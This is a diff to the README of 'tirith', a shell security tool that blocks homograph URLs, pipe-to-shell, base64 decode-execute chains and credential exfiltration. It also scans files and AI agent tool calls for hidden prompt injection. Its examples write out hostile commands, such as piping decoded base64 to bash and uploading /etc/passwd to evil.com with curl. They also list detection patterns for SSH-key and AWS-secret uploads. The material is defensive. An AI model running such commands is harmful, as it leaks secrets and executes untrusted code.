@@ -23,9 +23,9 @@ Can you spot the difference?
 
 You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.
 
-Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question.
+Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question. AI agents run shell commands and install packages without inspecting what's inside.
 
-**Tirith stands at the gate.**
+**Tirith stands at the gate.** It intercepts commands, pasted content, and scanned files for homograph URLs, obfuscated payloads, credential exfiltration, and malicious AI skills/configs before they execute.
 
 ```bash
 brew install sheeki03/tap/tirith
@@ -78,6 +78,43 @@ tirith: WARNING
 
 Warning prints to stderr. Command still runs.
 
+**Base64 decode-execute chain — blocked:**
+
+```
+$ echo payload | base64 -d | bash
+
+tirith: BLOCKED
+  [HIGH] base64_decode_execute — Base64 decode piped to interpreter
+  [HIGH] pipe_to_interpreter — Pipe to interpreter: base64 | bash
+```
+
+Catches decode chains through sudo/env wrappers and PowerShell `-EncodedCommand` too.
+
+**Credential exfiltration — blocked:**
+
+```
+$ curl -d @/etc/passwd https://evil.com/collect
+
+tirith: BLOCKED
+  [HIGH] data_exfiltration — Data exfiltration via curl upload
+    curl command uploads sensitive data to a remote server
+```
+
+Covers all curl/wget upload flags, env vars (`$AWS_SECRET_ACCESS_KEY`), and command substitution.
+
+**Malicious skill file — caught on scan:**
+
+```
+$ tirith scan evil_skill.py
+
+tirith scan: evil_skill.py — 3 finding(s)
+  [MEDIUM] dynamic_code_execution — exec() near b64decode() in close proximity
+  [MEDIUM] obfuscated_payload — Long base64 string decoded and executed
+  [MEDIUM] suspicious_code_exfiltration — HTTP call passes sensitive data as argument
+```
+
+Scans JS/Python files for obfuscated payloads, dynamic code execution, and secret exfiltration patterns.
+
 **Normal commands — invisible:**
 
 ```
@@ -92,13 +129,16 @@ Nothing. Zero output. You forget tirith is running.
 
 ## What it catches
 
-**75+ detection rules across 13 categories.**
+**80+ detection rules across 15 categories.**
 
 | Category | What it stops |
 |----------|--------------|
 | **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels, lookalike TLDs, confusable domains |
 | **Terminal injection** | ANSI escape sequences, bidi overrides, zero-width characters, unicode tags, invisible math operators, variation selectors |
 | **Pipe-to-shell** | `curl \| bash`, `wget \| sh`, `httpie \| sh`, `xh \| sh`, `python <(curl ...)`, `eval $(wget ...)` — every source-to-sink pattern |
+| **Base64 decode-execute** | `base64 -d \| bash`, `python -c "exec(b64decode(...))"`, `powershell -EncodedCommand` — decode chains through sudo/env wrappers |
+| **Data exfiltration** | `curl -d @/etc/passwd`, `curl -T ~/.ssh/id_rsa`, `wget --post-file`, env var uploads (`$AWS_SECRET_ACCESS_KEY`), command substitution exfil |
+| **Code file scanning** | Obfuscated payloads (`eval(atob(...))`), dynamic code execution (`exec(b64decode(...))`), secret exfiltration via `fetch`/`requests.post` in JS/Python files |
 | **Credential detection** | AWS keys, GitHub PATs, Stripe/Slack/SendGrid/Anthropic/GCP/npm tokens, private key blocks, plus entropy-based generic secret detection |
 | **Post-compromise behavior** | Process memory scraping (`/proc/*/mem`), Docker remote privilege escalation, credential file sweeps — inspired by the TeamPCP attack |
 | **Command safety** | Dotfile overwrites, archive extraction to sensitive paths, cloud metadata endpoint access, private network access |
@@ -107,7 +147,7 @@ Nothing. Zero output. You forget tirith is running.
 | **Config file security** | Config injection, suspicious indicators, non-ASCII/invisible unicode in configs, MCP server security (insecure/untrusted/duplicate/permissive) |
 | **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs, web3 RPC endpoints, vet-not-configured |
 | **Path analysis** | Non-ASCII paths, homoglyphs in paths, double-encoding |
-| **Rendered content** | Hidden CSS/color content, hidden HTML attributes, markdown/HTML comments with instructions |
+| **Rendered content** | Hidden CSS/color content, hidden HTML attributes, comment content analysis (prompt injection at High, destructive commands at Medium) |
 | **Cloaking detection** | Server-side cloaking (bot vs browser), clipboard hidden content, PDF hidden text |
 
 ---
@@ -125,14 +165,7 @@ When AI agents execute shell commands (Claude Code, Codex, Cursor, etc.), tirith
 - **Works with every agent** — any tool that spawns a shell inherits tirith protection
 - **Zero agent modification** — the agent doesn't know tirith exists until a command is blocked
 
-```bash
-tirith setup claude-code    # installs hook in Claude Code's shell
-tirith setup codex           # installs hook in Codex's shell
-tirith setup cursor          # installs hook in Cursor's shell
-tirith setup gemini-cli      # installs hook in Gemini CLI's shell
-tirith setup pi-cli          # installs hook in Pi CLI's shell
-tirith setup openclaw        # installs before_tool_call plugin for OpenClaw
-```
+Use `tirith setup <tool>` for one-command configuration (see [AI Agent Integrations](#ai-agent-integrations)).
 
 ### MCP server (7 tools)
 
@@ -170,7 +203,7 @@ Detects content invisible to humans but readable by AI in HTML, Markdown, and PD
 
 - **CSS hiding** — `display:none`, `visibility:hidden`, `opacity:0`, `font-size:0`, off-screen positioning
 - **Color hiding** — white-on-white text, similar foreground/background (contrast ratio < 1.5:1)
-- **HTML/Markdown comments** — long comments hiding instructions for AI agents
+- **HTML/Markdown comments** — prompt injection phrases (High), destructive commands like `rm -rf` or `curl|bash` (Medium), long comments hiding instructions (Low)
 - **PDF hidden text** — sub-pixel rendered text (font-size < 1px) invisible to readers but parseable by LLMs
 
 ### Cloaking detection
@@ -287,7 +320,7 @@ tirith init --shell fish | source   # in ~/.config/fish/config.fish
 | fish | fish_preexec event | 3.5+ |
 | PowerShell | PSReadLine handler | 7.0+ |
 
-In bash, enter mode is used by default with a startup health gate and runtime self-healing. SSH sessions automatically fall back to preexec mode for PTY compatibility. If enter mode detects a failure, it auto-degrades to preexec and persists the decision across shells. Unexpected tirith errors (crashes, OOM-kills) trigger a mixed fail-safe policy: bash degrades to preexec, other shells warn and execute, paste paths always discard. See [troubleshooting](docs/troubleshooting.md#unexpected-tirith-exit-codes) for details.
+Bash uses enter mode by default with automatic fallback to preexec on failure. See [troubleshooting](docs/troubleshooting.md#unexpected-tirith-exit-codes) for details on error handling and SSH fallback behavior.
 
 **Nix / Home-Manager:** tirith must be in your `$PATH` — the shell hooks call `tirith` by name at runtime. Adding it to `initContent` alone is not enough.
 
@@ -331,118 +364,24 @@ For manual configuration, see `mcp/clients/` for per-tool guides.
 
 ## Commands
 
-### `tirith check -- <cmd>`
-Analyze a command without executing it. Useful for testing what tirith would flag.
-
-```bash
-$ tirith check -- curl -sSL https://іnstall.example-clі.dev \| bash
-tirith: BLOCKED
-  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
-```
-
-### `tirith paste`
-Reads from stdin and analyzes pasted content. The shell hook calls this automatically when you paste into the terminal — you don't need to run it manually.
-
-### `tirith score <url>`
-Breaks down a URL's trust signals — TLS, domain age heuristics, known shorteners, Unicode analysis.
-
-```bash
-$ tirith score https://bit.ly/something
-```
-
-### `tirith diff <url>`
-Byte-level comparison showing exactly where suspicious characters are hiding.
-
-```
-$ tirith diff https://exаmple.com
-  Position 3: expected 0x61 (Latin a) | got 0xd0 0xb0 (Cyrillic а)
-```
-
-### `tirith run <url>`
-Safe replacement for `curl | bash`. Downloads to a temp file, shows SHA256, runs static analysis, opens in a pager for review, and executes only after you confirm. Creates a receipt you can verify later.
-
-```bash
-$ tirith run https://get.docker.com
-```
-
-### `tirith receipt {last,list,verify}`
-Track and verify scripts you've run through `tirith run`. Each execution creates a receipt with the script's SHA256 hash so you can audit what ran on your machine.
-
-```bash
-$ tirith receipt last        # show the most recent receipt
-$ tirith receipt list        # list all receipts
-$ tirith receipt verify <sha256>  # verify a specific receipt
-```
-
-### `tirith why`
-Explains the last rule that triggered — what it detected, why it matters, and what to do about it.
-
-### `tirith scan [path]`
-Scan files and directories for hidden content, config poisoning, invisible Unicode, and MCP configuration issues. Supports SARIF output for CI integration.
-
-```bash
-$ tirith scan .                     # scan current directory
-$ tirith scan --file .cursorrules   # scan a specific file
-$ tirith scan --ci --fail-on high   # exit non-zero if findings meet threshold
-$ tirith scan --sarif               # SARIF 2.1.0 output for CI tools
-```
-
-### `tirith fetch <url>`
-Check a URL for server-side cloaking — detects when a server returns different content to bots vs browsers.
-
-```bash
-$ tirith fetch https://example.com/install.sh
-```
-
-### `tirith checkpoint {create,list,restore,diff,purge}`
-Snapshot files before risky operations, then roll back if something goes wrong.
-
-```bash
-$ tirith checkpoint create ~/.bashrc ~/.zshrc   # snapshot before changes
-$ tirith checkpoint list                        # list all checkpoints
-$ tirith checkpoint diff <id>                   # show what changed
-$ tirith checkpoint restore <id>                # roll back
-$ tirith checkpoint purge                       # clean up old checkpoints
-```
-
-### `tirith gateway {run,validate-config}`
-MCP gateway proxy that intercepts AI agent shell tool calls for security analysis before execution.
-
-```bash
-$ tirith gateway run --upstream-bin npx --upstream-arg mcp-server --config gateway.yaml
-$ tirith gateway validate-config --config gateway.yaml
-```
-
-### `tirith setup <tool>`
-One-command setup for AI coding tools. Configures shell hooks, MCP server registration, and zshenv guards.
-
-```bash
-$ tirith setup claude-code --with-mcp    # Claude Code + MCP server
-$ tirith setup codex                     # OpenAI Codex
-$ tirith setup cursor                    # Cursor
-$ tirith setup gemini-cli --with-mcp    # Gemini CLI + MCP server
-$ tirith setup pi-cli                   # Pi CLI
-$ tirith setup vscode                    # VS Code
-$ tirith setup windsurf                  # Windsurf
-```
-
-### `tirith audit {export,stats,report}`
-Audit log management for compliance and analysis.
-
-```bash
-$ tirith audit export --format csv --since 2025-01-01
-$ tirith audit stats --json
-$ tirith audit report --format html --since 2025-01-01
-```
-
-### `tirith init`
-Prints the shell hook for your current shell. Add `eval "$(tirith init)"` to your shell profile to activate tirith. If you use multiple shells, you can force a specific one with `tirith init --shell bash|zsh|fish`.
-
-### `tirith doctor`
-Diagnostic check — shows detected shell, hook status, policy file location, and configuration. Run this if something isn't working.
-
-### `tirith mcp-server`
-Run tirith as an MCP server over JSON-RPC stdio. Used by AI coding tools for integrated security analysis.
+| Command | What it does |
+|---------|-------------|
+| `tirith check -- <cmd>` | Analyze a command without executing it |
+| `tirith paste` | Check pasted content (called automatically by shell hooks) |
+| `tirith scan [path]` | Scan files/directories for hidden content, config poisoning, malicious code patterns. Supports `--sarif` and `--ci --fail-on high` |
+| `tirith run <url>` | Safe `curl \| bash` replacement. Downloads, analyzes, shows SHA256, opens for review, executes only after confirmation |
+| `tirith score <url>` | Break down a URL's trust signals |
+| `tirith diff <url>` | Byte-level comparison showing where suspicious characters hide |
+| `tirith fetch <url>` | Detect server-side cloaking (different content for bots vs browsers) |
+| `tirith why` | Explain the last rule that triggered |
+| `tirith receipt {last,list,verify}` | Track and verify scripts run through `tirith run` |
+| `tirith checkpoint {create,restore,diff}` | Snapshot files before risky operations, roll back if needed |
+| `tirith setup <tool>` | One-command setup for AI coding tools (see [AI Agent Integrations](#ai-agent-integrations)) |
+| `tirith gateway run` | MCP gateway proxy for intercepting AI agent shell tool calls |
+| `tirith audit {export,stats,report}` | Audit log management for compliance |
+| `tirith init` | Print the shell hook for your shell profile |
+| `tirith doctor` | Diagnostic check for hook status and configuration |
+| `tirith mcp-server` | Run as MCP server over JSON-RPC stdio |
 
 ---
 
@@ -516,7 +455,7 @@ Disable: `export TIRITH_LOG=0`
 
 ## License
 
-**Core security coverage ships in the open-source tree.** All 75+ detection rules and the MCP server are available from source. The repository still contains legacy licensing and policy-server code paths, so avoid assuming that every runtime path is already tier-free.
+**Core security coverage ships in the open-source tree.** All 80+ detection rules and the MCP server are available from source. The repository still contains legacy licensing and policy-server code paths, so avoid assuming that every runtime path is already tier-free.
 
 tirith is dual-licensed:
 
